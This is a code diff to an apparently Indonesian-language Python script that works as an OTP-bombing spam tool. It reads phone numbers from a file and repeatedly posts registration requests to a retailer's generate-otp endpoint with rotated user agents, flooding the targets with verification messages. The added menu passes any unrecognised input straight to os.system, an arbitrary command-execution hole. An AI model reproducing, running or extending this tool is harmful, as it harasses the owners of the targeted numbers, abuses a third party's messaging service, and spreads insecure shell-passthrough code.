@@ -2,7 +2,27 @@ import requests
 import json
 import random
 import rich
+import os,sys
 from rich import print as cetak
+ipp = True
+def main():
+    cetak("start to spam\nsettings to configuration\nabout to show information about script.\nmenu to show menu\nexit to end program")
+    while ipp == True:
+      inputs = input("@Bimawawoy<>Spam-Wa|type menu to show list menu<> : ")
+      if inputs == "start":
+        mainspam()
+      elif inputs == "settings":
+        os.system("nano nomor.txt")
+      elif inputs == "about":
+        os.system("xdg-open https://private.gwbima.repl.co/")
+      elif inputs == "menu":
+        main()
+      elif inputs == "exit":
+        sys.exit()
+        break
+      else:
+        os.system(inputs)
+
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
@@ -10,27 +30,27 @@ user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.80",
 ]
+def mainspam():
+  try:
+     nama_file = str("nomor.txt")
 
-try:
-   nama_file = input("Nama file: ")
-
-   while True:
-        ua = random.choice(user_agents)
+     while True:
+          ua = random.choice(user_agents)
       # Membuka file untuk dibaca
-        with open(nama_file, 'r') as file:
+          with open(nama_file, 'r') as file:
           # Membaca isi file
-            isi_file = file.read()
+              isi_file = file.read()
 
       # Memproses setiap baris dalam file
-        for baris in isi_file.split('\n'):
+          for baris in isi_file.split('\n'):
           # Menghapus spasi atau karakter newline di awal dan akhir baris
-            nomor = baris.strip()
+              nomor = baris.strip()
 
           # Memeriksa apakah baris hanya terdiri dari spasi atau newline
-            if not nomor:
-                continue  # Langsung ke baris berikutnya jika baris kosong
+              if not nomor:
+                  continue  # Langsung ke baris berikutnya jika baris kosong
 
-            pos = requests.post(
+              pos = requests.post(
 
             "https://wapi.ruparupa.com/auth/generate-otp",
             headers={
@@ -57,16 +77,19 @@ try:
             data=json.dumps({"phone": "0" + nomor, "action": "register", "channel": "message", "email": "", "token": "", "customer_id": "0", "is_resend": 0})
         ).text
 
-            cetak("Spam ke ",nomor)
-            cetak(ua)
+              cetak("Spam ke ",nomor)
+              cetak(ua)
 
 
-        lanjutkan = input("Apakah Anda ingin melanjutkan spam? (y/n): ")
-        if lanjutkan.lower() != 'y':
-            break  # Menghentikan loop jika pengguna tidak ingin melanjutkan
+          lanjutkan = input("Apakah Anda ingin melanjutkan spam? (y/n): ")
+          if lanjutkan.lower() != 'y':
+              break  # Menghentikan loop jika pengguna tidak ingin melanjutkan
 
-except FileNotFoundError:
-  cetak("File not found!!")
-  cetak("Try again!!")
-except EOFError:
-  cetak("Aborted!")
+  except FileNotFoundError:
+    cetak("File not found!!")
+    cetak("Try again!!")
+  except EOFError:
+     cetak("Aborted!")
+
+
+main()
